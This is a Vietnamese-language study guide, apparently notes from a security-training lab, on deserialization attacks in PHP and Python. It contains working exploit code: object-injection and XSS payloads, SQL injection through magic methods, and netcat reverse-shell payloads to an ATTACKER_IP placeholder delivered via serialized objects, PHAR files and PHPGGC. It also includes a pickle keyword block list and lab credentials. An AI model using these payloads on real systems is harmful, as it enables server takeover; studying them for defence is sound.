# MỤC LỤC
---
## Introduction to Serialization and Deserialization
1. [Giới thiệu về Serialization](#1-giới-thiệu-về-serialization)
Giới thiệu về quá trình serialization và deserialization trong lập trình.

2. [Giới thiệu về tấn công Deserialization](#2-giới-thiệu-về-tấn-công-deserialization)
Giới thiệu về tấn công Deserialization và cách thức hoạt động.
## Analyzing Deserialization vulnerabilities and attacks in PHP
3. [Xác định lỗ hổng trong PHP: Kịch bản (HTBank)](#3-xác-định-lỗ-hổng-trong-php-kịch-bản-htbank)
Phân tích kịch bản cụ thể của lỗ hổng Deserialization trong ứng dụng PHP (HTBank).

4. [Phân tích lỗ hổng Object Injection và XSS trong PHP](#4-phân-tích-lỗ-hổng-object-injection-và-xss-trong-php)
Phân tích chi tiết về lỗ hổng Object Injection và XSS trong PHP.

5. [Tổng Quan về RCE qua Magic Methods trong PHP](#5-tổng-quan-về-rce-qua-magic-methods-trong-php)
Tổng quan về cách thức Remote Code Execution (RCE) qua Magic Methods trong PHP.

6. [Tóm tắt về RCE qua PHAR Deserialization và cách khai thác](#6-tóm-tắt-về-rce-qua-phar-deserialization-và-cách-khai-thác)
Tóm tắt về cách Remote Code Execution có thể xảy ra qua PHAR Deserialization trong PHP và cách khai thác.

7. [Sử dụng PHPGGC để khai thác lỗ hổng Deserialization và RCE](#7-sử-dụng-phpggc-để-khai-thác-lỗ-hổng-deserialization-và-rce)
Hướng dẫn sử dụng công cụ PHPGGC để khai thác lỗ hổng Deserialization và RCE trong PHP.
## Object Injection Attack in Python
8. [Phát hiện Lỗ hổng Deserialization trong HTBooks GmbH](#8-phát-hiện-lỗ-hổng-deserialization-trong-htbooks-gmbh)
Cách phát hiện và khai thác lỗ hổng Deserialization trong ứng dụng HTBooks GmbH.

9. [Tấn công Object Injection trong Python (HTBooks GmbH)](#9-tấn-công-object-injection-trong-python-htbooks-gmbh)
Phân tích tấn công Object Injection trong Python, ứng dụng HTBooks GmbH.
## Types of attacks tools and exploits
10. [Tấn công Remote Code Execution (RCE) qua Serialization (Object Injection)](#10-tấn-công-remote-code-execution-rce-qua-serialization-object-injection)
Hướng dẫn về tấn công Remote Code Execution qua Serialization và Object Injection.

11. [Công Cụ trong Tấn Công Deserialization Python](#11-công-cụ-trong-tấn-công-deserialization-python)
Các công cụ hỗ trợ khai thác tấn công Deserialization trong Python.
## Deserialization Attack Tools and Prevention
12. [Tránh Các Lỗ Hổng Deserialization trong HTBank (PHP)](#12-tránh-các-lỗ-hổng-deserialization-trong-htbank-php)
Phương pháp và biện pháp phòng ngừa các lỗ hổng Deserialization trong ứng dụng PHP (HTBank).


---
# 1. Giới thiệu về Serialization

Serialization là quá trình chuyển đổi một đối tượng trong bộ nhớ thành chuỗi byte để lưu trữ hoặc truyền qua mạng. Sau đó, đối tượng này có thể được tái tạo lại trong bộ nhớ, có thể bởi một chương trình khác hoặc trên một môi trường máy khác.  
Quá trình ngược lại là **Deserialization**, dùng để tái tạo đối tượng từ dữ liệu đã được tuần tự hóa.  

Nhiều ngôn ngữ lập trình hướng đối tượng hỗ trợ serialization một cách tự nhiên, bao gồm:  
- Java  
- Ruby  
- Python  
- PHP  
- C#  

Trong phần này, chúng ta sẽ tập trung vào **Python** và **PHP**. Tuy nhiên, các khái niệm dưới đây cũng áp dụng được với hầu hết các ngôn ngữ hỗ trợ serialization.

---

### **1. PHP Serialization**

**Ví dụ:**  
Cách serialize một mảng trong PHP:  
```php
$original_data = array("HTB", 123, 7.77);
$serialized_data = serialize($original_data);
echo $serialized_data;
// Output: a:3:{i:0;s:3:"HTB";i:1;i:123;i:2;d:7.77;}

$reconstructed_data = unserialize($serialized_data);
var_dump($reconstructed_data);
// Output:
// array(3) {
//   [0] => string(3) "HTB"
//   [1] => int(123)
//   [2] => float(7.77)
// }
```

**Giải thích cấu trúc serialized data:**  
- `a:3`: Mảng (`Array`) có 3 phần tử.  
- `i:0;s:3:"HTB";`: Phần tử đầu tiên, chỉ mục (`Index`) là `0`, kiểu dữ liệu là chuỗi (`String`) có độ dài `3`, giá trị `"HTB"`.  
- `i:1;i:123;`: Phần tử thứ hai, chỉ mục là `1`, kiểu số nguyên (`Integer`), giá trị `123`.  
- `i:2;d:7.77;`: Phần tử thứ ba, chỉ mục là `2`, kiểu số thực (`Double`), giá trị `7.77`.  

---

### **2. Python Serialization**

**Ví dụ:**  
Cách serialize một mảng trong Python:  
```python
import pickle

original_data = ["HTB", 123, 7.77]
serialized_data = pickle.dumps(original_data)
print(serialized_data)
# Output: b'\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x03HTB\x94K{G@\x1f\x14z\xe1G\xae\x14e.'

reconstructed_data = pickle.loads(serialized_data)
print(reconstructed_data)
# Output: ['HTB', 123, 7.77]
```

**Giải thích cấu trúc serialized data:**  
Dữ liệu tuần tự hóa trong Python khó đọc hơn so với PHP vì nó sử dụng các mã opcode cho một **máy ảo Pickle Machine (PM)**.  

**Phân tích các mã opcode:**  
- `\x80\x04`: Xác định phiên bản giao thức Pickle (protocol version 4).  
- `]`: Tạo một danh sách rỗng trên stack.  
- `\x8c\x03HTB`: Thêm chuỗi `"HTB"` vào stack.  
- `K{`: Thêm số nguyên `123` vào stack.  
- `G@\x1f\x14z\xe1G\xae\x14`: Thêm số thực `7.77` vào stack.  
- `e`: Ghép các phần tử đã thêm vào danh sách.  
- `.`: Kết thúc quá trình tuần tự hóa.

---

### **So sánh PHP và Python Serialization**

| **Tiêu chí**         | **PHP**                                     | **Python**                                 |
|-----------------------|---------------------------------------------|--------------------------------------------|
| **Dễ đọc**           | Rất dễ đọc với dữ liệu tuần tự hóa rõ ràng   | Khó đọc vì sử dụng mã opcode phức tạp      |
| **Cách tái tạo**      | Sử dụng `serialize()` và `unserialize()`    | Sử dụng `pickle.dumps()` và `pickle.loads()` |
| **Ứng dụng**         | Chủ yếu trong các hệ thống PHP truyền thống | Được sử dụng rộng rãi trong các ứng dụng Python hiện đại |

---

# 2. Giới thiệu về tấn công Deserialization

**Deserialization** là quá trình ngược lại của **Serialization**, tức là tái tạo đối tượng ban đầu từ dữ liệu đã được tuần tự hóa. Khi ứng dụng thực hiện deserialization dữ liệu do người dùng kiểm soát, có nguy cơ xảy ra các **deserialization attacks** (tấn công deserialization).  

Các cuộc tấn công này có thể bao gồm:  
- Sửa đổi dữ liệu serialized được tạo bởi ứng dụng để khai thác lỗ hổng.  
- Tự tạo và cung cấp dữ liệu serialized độc hại cho ứng dụng.  

---

### **Lịch sử**

Deserialization được xác định là một vector tấn công từ năm 2011, nhưng trở nên phổ biến vào năm 2016 sau sự kiện **Java Deserialization Apocalypse**.  
Trong một bài thuyết trình năm 2015, các nhà nghiên cứu bảo mật **@frohoff** và **@gebl** đã giải thích chi tiết về các cuộc tấn công deserialization và công bố công cụ nổi tiếng **ysoserial**, cho phép tạo payload độc hại trong Java.  

Hiện nay, **Insecure Deserialization** nằm trong **OWASP Top 10 (A08:2021 - Software and Data Integrity Failures)**, với nhiều CVE được công bố hàng năm liên quan đến vấn đề này.

---

### **Các hình thức tấn công**

#### **1. Object Injection**
Kẻ tấn công sửa đổi dữ liệu serialized để ứng dụng nhận được thông tin không mong muốn khi deserialization.  
**Ví dụ:** Nếu một đối tượng serialized chứa vai trò (role) của người dùng, kẻ tấn công có thể chỉnh sửa để hệ thống nhận rằng họ có quyền quản trị (admin).  

#### **2. Remote Code Execution (RCE)**
Tấn công này sử dụng payload serialized độc hại để thực thi mã lệnh trên máy chủ khi dữ liệu được deserialized.

---

### **Xác định Serialization**

#### **White-Box Testing**
Khi có quyền truy cập mã nguồn, ta tìm các hàm liên quan đến deserialization.  
Ví dụ:  
- **PHP**: `unserialize()`  
- **Python**: `pickle.loads()`, `jsonpickle.decode()`, `yaml.load()`  
- **Java**: `readObject()`  
- **C# / .NET**: `Deserialize()`  
- **Ruby**: `Marshal.load()`  

#### **Black-Box Testing**
Nếu không có mã nguồn, serialized data thường dễ nhận biết qua đặc điểm:  
- **PHP**:  
  ```php
  a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";}
  ```  
- **Python Pickle**:  
  - Protocol 0: `(lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na.`  
  - Protocol 4 (Python 3.8+): Bytes bắt đầu bằng `80 04 95` (Hex) và kết thúc bằng `.`  

- **Python JSONPickle**:  
  ```json
  ["Test", "Data", [4], "ACADEMY"]
  ```  

- **Java**: Bytes bắt đầu bằng `AC ED 00 05 73 72` (Hex) hoặc `rO0ABXNy` (Base64).  
- **C# / .NET**: Bytes bắt đầu bằng `00 01 00 00 00 ff ff ff ff` (Hex).  
- **Ruby**: Bytes bắt đầu bằng `04 08` (Hex).  

**Công cụ hỗ trợ:**  
- **Freddy**: Extension của Burp Suite hỗ trợ phát hiện và khai thác serialization trong Java/.NET.  

---

# 3. Xác định lỗ hổng trong PHP: Kịch bản (HTBank)

---

### **Tình huống**

HTBank GmbH yêu cầu đánh giá bảo mật (white-box) trang web mới của họ.  
Họ cung cấp:  
1. URL trang web.  
2. Mã nguồn của ứng dụng.  
3. Một gợi ý rằng không thể tạo tài khoản với email dạng `@htbank.com` (dành cho quản trị viên).  

---

### **Khám phá ban đầu**

1. **Đăng nhập và tạo tài khoản**:  
   - Giao diện chính hiển thị màn hình đăng nhập nhưng không cung cấp thông tin đăng nhập.  
   - Có tùy chọn "Đăng ký".  
   - Thử tạo tài khoản với email `@htbank.com` dẫn đến thông báo lỗi:  
     - **"The email format is invalid"**.  

   - Tạo tài khoản với thông tin:  
     - Email: `[email protected]`  
     - Mật khẩu: `pentest`  

2. **Chuyển hướng sau đăng nhập**:  
   - Sau khi đăng nhập, giao diện chính chứa các nội dung chưa hoàn thiện.  
   - Có liên kết tới `/settings`.  

---

### **Khám phá tính năng Import/Export Settings**

Trên trang **Settings**, người dùng có thể:  
- Cập nhật thông tin tài khoản (username, email, password, profile picture).  
- Sử dụng chức năng Import/Export Settings.  

1. **Export Settings**:  
   - Kết quả trả về một chuỗi **Base64-encoded**.  
   - Giải mã chuỗi Base64 (sử dụng lệnh `base64 -d`):  
     ```bash
     echo -n "TzoyNDoiQXBwXEhlbHBlcnNcVXNl...SNIP..." | base64 -d
     ```
     Kết quả là một đối tượng **PHP serialized object**:  
     ```php
     O:24:"App\Helpers\UserSettings":4:{
       s:30:"App\Helpers\UserSettingsName";s:7:"pentest";
       s:31:"App\Helpers\UserSettingsEmail";s:16:"[email protected]";
       s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$kPfp572LjEN1HDYrBOoWqezWZcee58HteiIStVvRu6ndWimUqBN7a";
       s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";
     }
     ```

2. **Import Settings**:  
   - Chức năng này cho phép nhập chuỗi dữ liệu Base64-encoded và áp dụng các giá trị vào tài khoản hiện tại.  

---

### **Kiểm tra mã nguồn**

1. **Phân tích tính năng Import/Export Settings**:  
   - Tìm chuỗi `"Exported user settings!"` trong mã nguồn:  
     ```bash
     grep 'Exported user settings!' -nr .
     ```
     Kết quả:  
     ```
     ./app/Http/Controllers/HTController.php:123: Session::flash('ie-message', 'Exported user settings!');
     ```

2. **Mã xử lý Import/Export Settings**:  
   ```php
   public function handleSettingsIE(Request $request) {
       if (Auth::check()) {
           if (isset($request['export'])) {
               $user = Auth::user();
               $userSettings = new UserSettings($user->name, $user->email, $user->password, $user->profile_pic);
               $exportedSettings = base64_encode(serialize($userSettings));
               Session::flash('ie-message', 'Exported user settings!');
               Session::flash('ie-exported-settings', $exportedSettings);
           } else if (isset($request['import']) && !empty($request['settings'])) {
               $userSettings = unserialize(base64_decode($request['settings']));
               $user = Auth::user();
               $user->name = $userSettings->getName();
               $user->email = $userSettings->getEmail();
               $user->password = $userSettings->getPassword();
               $user->profile_pic = $userSettings->getProfilePic();
               $user->save();
               Session::flash('ie-message', "Imported settings for '" . $userSettings->getName() . "'");
           }
           return back();
       }
       return redirect("/login")->withSuccess('You must be logged in to complete this action');
   }
   ```

3. **Nhận xét**:  
   - **serialize** và **unserialize** được sử dụng để xử lý dữ liệu.  
   - Không có kiểm tra hoặc lọc dữ liệu nhập vào từ chuỗi Base64.  
   - Điều này cho phép nhập dữ liệu tùy ý (arbitrary data), dẫn đến khả năng khai thác lỗ hổng **deserialization vulnerability**.
   - Khai thác lỗ hổng deserialization dựa trên phân tích mã nguồn.
---

### **Điểm quan trọng cần chú ý**

- **Import/Export Settings**: Đây là một tính năng phổ biến trong các ứng dụng (ví dụ: game), dễ bị lỗ hổng nếu không được bảo mật.  
- **Mối nguy hiểm của Deserialization**:  
  - Kẻ tấn công có thể chèn dữ liệu tùy ý (malicious payload).  
  - Trong trường hợp này, có khả năng thay đổi thông tin tài khoản hoặc thực thi mã độc trên máy chủ (RCE).  

---
# 4. Phân tích lỗ hổng Object Injection và XSS trong PHP

---

### **1. Tóm tắt vấn đề**

#### **Lỗ hổng đầu tiên - Object Injection**
- **Nguyên nhân**: Ứng dụng sử dụng hàm `serialize` và `unserialize` mà không kiểm tra dữ liệu nhập vào.
- **Khai thác**: Tạo một đối tượng PHP tùy chỉnh với thông tin tùy ý, sau đó truyền dữ liệu đã mã hóa Base64 vào tính năng **Import Settings**.  
- **Tác động**: Thay đổi thông tin tài khoản như tên, email, hoặc mật khẩu mà không qua kiểm tra.

---

#### **Lỗ hổng thứ hai - Reflected XSS**
- **Nguyên nhân**: Biến người dùng điều khiển được hiển thị trên giao diện mà không được mã hóa HTML (sử dụng `{!! ... !!}` thay vì `{{ ... }}`).
- **Khai thác**: Truyền payload độc hại vào trường "Tên người dùng" để chèn mã JavaScript, dẫn đến **Reflected XSS**.  

---

### **2. Phân tích kỹ thuật**

#### **2.1. Object Injection**

1. **Mục tiêu**: Tạo tài khoản với email dạng `@htbank.com`, vốn bị chặn bởi hệ thống.  
2. **Chuẩn bị**:  
   - Tạo file `UserSettings.php` sao chép từ mã nguồn.  
   - Tạo file `exploit.php` để sinh chuỗi Base64 chứa đối tượng PHP:
     ```php
     <?php
     include('UserSettings.php');
     echo base64_encode(serialize(new \App\Helpers\UserSettings(
         'pentest', 
         '[email protected]', 
         '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 
         'default.jpg')));
     ?>
     ```

3. **Kết quả**:  
   - Lệnh `php exploit.php` trả về chuỗi Base64:  
     ```
     TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRp...SNIP...WMiO3M6MTE6ImRlZmF1bHQuanBnIjt9
     ```

4. **Kiểm tra cục bộ**:  
   - File `target.php` mô phỏng cách ứng dụng xử lý dữ liệu nhập:
     ```php
     <?php
     include('UserSettings.php');
     $userSettings = unserialize(base64_decode($argv[1]));
     print('$user->name = ' . $userSettings->getName() . "\n");
     print('$user->email = ' . $userSettings->getEmail() . "\n");
     print('$user->password = ' . $userSettings->getPassword() . "\n");
     print('$user->profile_pic = ' . $userSettings->getProfilePic() . "\n");
     ?>
     ```
   - Chạy lệnh:  
     ```bash
     php target.php TzoyNDoiQXBwXEhlbHBlcnNcVXNl...SNIP...WMiO3M6MTE6ImRlZmF1bHQuanBnIjt9
     ```
   - Kết quả:
     ```
     $user->name = pentest
     $user->email = [email protected]
     $user->password = $2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda
     $user->profile_pic = default.jpg
     ```

5. **Thử nghiệm thực tế**:  
   - Chèn chuỗi Base64 vào tính năng **Import Settings**.  
   - Email tài khoản được cập nhật thành `[email protected]`.

---

#### **2.2. Reflected XSS**

1. **Xác định vị trí lỗ hổng**:  
   - Tên người dùng được hiển thị lại trên giao diện thông qua biến `ie-message` mà không được mã hóa HTML.  
   - Mã nguồn tại `resources/views/settings.blade.php`:  
     ```html
     <p class="text-success">{!! Session::get('ie-message') !!}</p>
     ```

2. **Tạo payload XSS**:  
   - Cập nhật file `exploit.php` để tạo tên người dùng chứa mã JavaScript:  
     ```php
     <?php
     include('UserSettings.php');
     echo base64_encode(serialize(new \App\Helpers\UserSettings(
         '<script>alert(1)</script>', 
         '[email protected]', 
         '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 
         'default.jpg')));
     ?>
     ```

3. **Kiểm tra cục bộ**:  
   - Chạy lệnh:  
     ```bash
     php target.php TzoyNDoiQXBwXEhlbHBlcnNcVXNlcl...SNIP...x0LmpwZyI7fQ==
     ```
   - Kết quả:
     ```
     $user->name = <script>alert(1)</script>
     $user->email = [email protected]
     $user->password = $2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda
     $user->profile_pic = default.jpg
     ```

4. **Thử nghiệm thực tế**:  
   - Nhập payload vào hệ thống.  
   - Mã `<script>alert(1)</script>` được thực thi, xác nhận thành công **Reflected XSS**.  

---


# 5. Tổng Quan về RCE qua Magic Methods trong PHP

Magic methods trong PHP là các hàm được định nghĩa với tiền tố `__` (hai dấu gạch dưới) và thường được PHP tự động gọi trong các tình huống cụ thể. Trong bối cảnh tấn công, các magic methods như `__wakeup`, `__sleep`, và `__construct` có thể bị lợi dụng để thực thi mã hoặc gây tổn hại cho hệ thống, đặc biệt khi chúng tương tác với dữ liệu đầu vào của người dùng.

### Tấn Công RCE qua `__wakeup`

Trong đoạn mã được cung cấp:
- Hàm `__wakeup` sử dụng `shell_exec` để thực thi một lệnh hệ thống. 
- Biến `$this->getName()` trong lệnh được lấy từ dữ liệu do người dùng kiểm soát, dẫn đến khả năng tấn công **command injection**.

#### Cách Khai Thác:

1. **Chuẩn Bị Payload:**
   - Tạo một payload lợi dụng để phá vỡ cú pháp lệnh `echo` bằng dấu `";`.
   - Chèn lệnh thực thi trái phép, ví dụ: mở một shell từ xa bằng `netcat`.

   ```php
   echo base64_encode(serialize(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', '[email protected]', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
   ```

2. **Kiểm Tra Payload Cục Bộ:**
   - Tạo một file PHP mô phỏng việc gọi hàm `__wakeup` và kiểm tra xem lệnh đã được chèn đúng hay chưa.
   - Kết nối đến máy tấn công qua Netcat để xác minh khả năng mở kết nối shell.

   ```bash
   nc -nvlp 9999
   ```

3. **Thực Thi Payload Trên Mục Tiêu:**
   - Gửi payload được mã hóa Base64 lên hệ thống mục tiêu qua giao diện người dùng (nếu có) hoặc API nhập dữ liệu.

---

### Tấn Công SQL Injection qua Magic Methods

Trong ví dụ SQLi:
- Lớp `UserModel` có hàm `__get` trực tiếp chèn đầu vào người dùng vào một truy vấn SQL mà không thực hiện biện pháp bảo mật như escaping hoặc chuẩn bị câu lệnh (`prepared statements`).
- Lớp `UserProperty` gọi `__wakeup` để tạo một truy vấn SQL mới khi đối tượng được deserialize.

#### Cách Khai Thác:

1. **Tạo Payload SQL Injection:**
   - Sử dụng cú pháp SQL để thao tác với cơ sở dữ liệu, ví dụ: liệt kê bảng (`group_concat` trên `information_schema.tables`).

   ```php
   $up = new UserProperty(1, "group_concat(table_name) from information_schema.tables where table_schema='htbank';-- ");
   echo POST_Check_User_Property(serialize($up));
   ```

2. **Chạy Payload:**
   - Khi payload được deserialize, truy vấn SQL độc hại sẽ được thực thi.

   **Kết Quả:**
   ```bash
   failed_jobs,migrations,password_resets,personal_access_tokens,users
   ```

---


# 6. Tóm tắt về RCE qua PHAR Deserialization và cách khai thác

#### **1. Tìm kiếm lỗ hổng**
Trong ví dụ này, chúng ta kiểm tra chức năng tải ảnh đại diện của ứng dụng. Mặc dù hệ thống thông báo chỉ cho phép tải ảnh định dạng `.jpg`, nhưng backend không thực hiện kiểm tra đầu vào, dẫn đến việc có thể tải bất kỳ tệp nào lên máy chủ.

**Điểm yếu:**
- Tệp được lưu với tên ngẫu nhiên nhưng kèm đuôi `.jpg`.
- Ứng dụng cung cấp một endpoint `/image` sử dụng `file_exists()` để kiểm tra tệp.

#### **2. Tổng quan về PHAR**
PHAR (PHP Archive) là một định dạng tệp tương tự JAR của Java, chứa cả mã PHP và dữ liệu metadata. Metadata này có thể chứa các đối tượng PHP được tuần tự hóa (serialized). Trước PHP 8.0, PHP tự động giải tuần tự hóa metadata khi thực hiện các thao tác như `file_exists()` hoặc `file_get_contents()` trên tệp PHAR.

**Quan trọng:**
- Kẻ tấn công có thể lợi dụng việc này để giải tuần tự hóa dữ liệu độc hại được nhúng trong metadata của tệp PHAR.

#### **3. Khai thác lỗ hổng PHAR Deserialization**

##### **Bước 1: Tạo PHAR độc hại**
Tạo một tệp PHAR với metadata chứa payload. Ví dụ payload ở đây là khởi động reverse shell.

```php
<?php
include('UserSettings.php'); // Định nghĩa đối tượng UserSettings
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString('0', ''); // Nội dung tệp
$phar->setStub("<?php __HALT_COMPILER(); ?>"); // Dừng xử lý mã PHP trong tệp
$phar->setMetadata(new \App\Helpers\UserSettings(
    '"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 
    '[email protected]', 
    '$2y$10$hash_here', 
    'default.jpg'
)); // Metadata chứa payload
$phar->stopBuffering();
```

**Ghi chú:**  
- Nếu gặp lỗi `phar.readonly`, chỉnh sửa file `/etc/php/7.4/cli/php.ini` bằng cách đặt `phar.readonly = Off`.

##### **Bước 2: Tải lên tệp PHAR**
- Đổi tên tệp PHAR thành `exploit.jpg`.
- Tải tệp lên thông qua chức năng tải ảnh đại diện.

##### **Bước 3: Kích hoạt khai thác**
- Lấy đường dẫn của tệp đã tải lên và thêm tiền tố `phar://`.
- Truy cập đường dẫn:  
  ```
  http://SERVER_IP:8000/image?_=phar://uploads/<MD5>.jpg
  ```
- Máy chủ sẽ gọi `file_exists('phar://uploads/MD5.jpg')`, dẫn đến việc giải tuần tự hóa metadata và thực thi payload.

##### **Bước 4: Nhận shell**
- Chạy lệnh Netcat để lắng nghe:  
  ```
  nc -nvlp 9999
  ```
- Khi payload được kích hoạt, máy chủ sẽ kết nối ngược lại, cung cấp shell.

---

#### **4. Kết quả khai thác**
Kẻ tấn công nhận được quyền truy cập vào máy chủ qua reverse shell. Ví dụ, kết quả thực hiện lệnh `ls -l` trên máy chủ:

```
drwxr-xr-x 2 kali kali 4096 Oct 19 21:38 css
-rw-r--r-- 1 kali kali 5963 Oct 19 21:35 default.jpg
-rw-r--r-- 1 kali kali 1710 Apr 12  2022 index.php
drwxr-xr-x 2 kali kali 4096 Oct 19 22:47 uploads
```

---

# 7. Sử dụng PHPGGC để khai thác lỗ hổng Deserialization và RCE

#### **1. Giới thiệu PHPGGC**
PHPGGC (**PHP Generic Gadget Chains**) là công cụ hỗ trợ khai thác lỗ hổng deserialization trong PHP. Công cụ này cung cấp các "gadget chain" - chuỗi hàm được trích xuất từ mã nguồn của các framework PHP phổ biến. Các gadget chain này có thể được dùng để:
- Đọc/ghi tệp.
- Thực thi mã từ xa (RCE).
- Và nhiều hành động khác.

#### **2. Trường hợp thực tế: Laravel Gadget Chain**
Ứng dụng đang kiểm tra sử dụng Laravel phiên bản 8.83.25. PHPGGC hỗ trợ nhiều gadget chain cho Laravel, trong đó có **Laravel/RCE9**, cho phép thực thi mã từ xa qua việc gọi hàm PHP (ví dụ: `system()`).

---

### **3. Khai thác với PHPGGC**

##### **Bước 1: Cài đặt PHPGGC**
Tải xuống và cài đặt PHPGGC từ GitHub:
```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
```

##### **Bước 2: Tạo payload**
Sử dụng gadget chain `Laravel/RCE9` để tạo payload RCE, ví dụ lệnh tạo reverse shell:
```bash
phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b
```

Lệnh này tạo chuỗi payload được mã hóa Base64:
```
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2...SNIP...Jhc2giO319
```

##### **Bước 3: Thử nghiệm payload**
1. Chèn chuỗi Base64 vào vị trí dữ liệu mà ứng dụng dễ bị tổn thương (ví dụ: thông qua deserialization).
2. Khởi động một listener trên máy kẻ tấn công:
   ```bash
   nc -nvlp 9999
   ```
3. Sau khi payload được thực thi, bạn sẽ nhận được kết nối shell từ máy chủ.

---

### **4. Khai thác PHAR Deserialization với PHPGGC**
Nếu ứng dụng hỗ trợ tải lên tệp, ta có thể lợi dụng PHAR để khai thác. PHPGGC hỗ trợ tạo tệp PHAR chứa payload deserialization:

##### **Bước 1: Tạo tệp PHAR**
Sử dụng lệnh sau để tạo tệp PHAR với gadget chain:
```bash
phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar
```

##### **Bước 2: Tải lên tệp PHAR**
1. Đổi tên `exploit.phar` thành `exploit.jpg` để qua mặt kiểm tra định dạng (nếu có).
2. Tải tệp lên máy chủ thông qua chức năng tải ảnh.

##### **Bước 3: Kích hoạt payload**
1. Lấy liên kết tệp tải lên, thêm tiền tố `phar://` vào trước đường dẫn.
2. Truy cập đường dẫn:
   ```
   http://SERVER_IP:8000/image?_=phar://uploads/<MD5>.jpg
   ```
3. Khi máy chủ gọi `file_exists('phar://uploads/<MD5>.jpg')`, payload sẽ được kích hoạt.

##### **Bước 4: Nhận shell**
Lắng nghe kết nối từ máy chủ:
```bash
nc -nvlp 9999
```
Khi payload thành công, bạn sẽ nhận được quyền truy cập shell.

---

# 8. Phát hiện Lỗ hổng Deserialization trong HTBooks GmbH

#### **1. Tình huống và bối cảnh**
HTBooks GmbH & Co KG đã thuê chúng ta thực hiện một bài kiểm tra white-box (kiểm tra an ninh) trên trang web của họ. Chúng ta có được quyền truy cập vào mã nguồn, URL và thông tin đăng nhập sau:

- Tài khoản đăng nhập: `franz.mueller:bierislekker`.

#### **2. Quá trình khám phá**
- Sau khi đăng nhập vào trang web, chúng ta tìm thấy một liên kết đến trang **Admin Panel**, nhưng cố gắng truy cập vào đó lại nhận được thông báo **Access Denied** (Truy cập bị từ chối), vì tài khoản `franz.mueller` không phải là quản trị viên.
- Kiểm tra mã nguồn của trang `templates/admin.html` cho thấy điều kiện kiểm tra quyền quản trị viên:  
  ```python
  {% if user.isAdmin() %}
      ...
  {% else %}
      <div class="notification is-danger">
          Access denied.
      </div>
  {% endif %}
  ```

#### **3. Khám phá Cookie `auth_8bH3mjF6n9`**
- Trong quá trình kiểm tra, chúng ta phát hiện một cookie có tên là `auth_8bH3mjF6n9`, có giá trị đã được mã hóa **base64**. Sau khi giải mã, chúng ta nhận được chuỗi bắt đầu bằng `gASVSgAAAAAAAACMC...`, và qua phân tích, ta nhận thấy đây có thể là một đối tượng **Pickle** của Python.
- Dữ liệu giải mã được:
  ```bash
  echo "gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg==" | base64 -d | xxd
  ```

#### **4. Phân tích Mã nguồn và Mối quan hệ với Cookie**
- Cookie `auth_8bH3mjF6n9` được thiết lập trong `app.py` và dùng hàm `util.auth.cookieToSession()` để chuyển đổi cookie thành một phiên làm việc (`Session`).
- Đoạn mã trong `login()` cho thấy rằng sau khi người dùng đăng nhập thành công, một đối tượng `Session` được tạo ra và sau đó được **serialize (pickle)** và mã hóa base64 để lưu vào cookie:
  ```python
  resp = make_response(redirect("/"))
  sess = util.auth.Session(request.form['username'])
  auth = util.auth.sessionToCookie(sess).decode()
  resp.set_cookie(util.config.AUTH_COOKIE_NAME, auth)
  ```
- Từ đây, ta có thể thấy rằng đối tượng `Session` chứa thông tin về tên người dùng và quyền hạn của họ (admin hay không). Đối tượng này được serialize bằng **pickle** và mã hóa bằng **base64** trước khi được lưu vào cookie.

#### **5. Mã nguồn của `Session` và các hàm liên quan**
- **Lớp `Session`**:
  ```python
  class Session:
      def __init__(self, username):
          con = sqlite3.connect(config.DB_NAME)
          cur = con.cursor()
          res = cur.execute("SELECT username, role FROM users WHERE username = ?", (username,))
          self.username, self.role = res.fetchone()
          con.close()
  
      def getUsername(self):
          return self.username
  
      def getRole(self):
          return self.role
  
      def isAdmin(self):
          return self.role == 'admin'
  ```

- **Hàm `sessionToCookie()` và `cookieToSession()`**:
  ```python
  def sessionToCookie(session):
      p = pickle.dumps(session)
      b = base64.b64encode(p)
      return b
  
  def cookieToSession(cookie):
      b = base64.b64decode(cookie)
      for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
          if badword in b:
              return None
      p = pickle.loads(b)
      return p
  ```
  - Hàm `sessionToCookie()` **pickle** đối tượng `Session` và mã hóa nó thành base64.
  - Hàm `cookieToSession()` **giải mã** base64, sau đó **pickle** đối tượng lại để phục hồi dữ liệu phiên làm việc.

#### **6. Phát hiện Lỗ hổng**
- Lỗ hổng chính nằm ở việc sử dụng **pickle** cho việc deserialize đối tượng từ cookie mà không kiểm tra đúng đắn nội dung của cookie. Mặc dù hàm `cookieToSession()` cố gắng lọc các từ khóa nguy hiểm như `subprocess`, nhưng điều này không đủ để ngăn chặn các tấn công, vì:
  - Việc kiểm tra chỉ đơn giản là tìm các từ khóa trong dữ liệu giải mã, điều này không đảm bảo an toàn.
  - Nếu attacker có thể tạo ra một đối tượng `Session` giả mạo, họ có thể thao túng dữ liệu và thay đổi quyền hạn, chẳng hạn như thay đổi vai trò người dùng thành "admin", từ đó có thể truy cập vào **Admin Panel**.
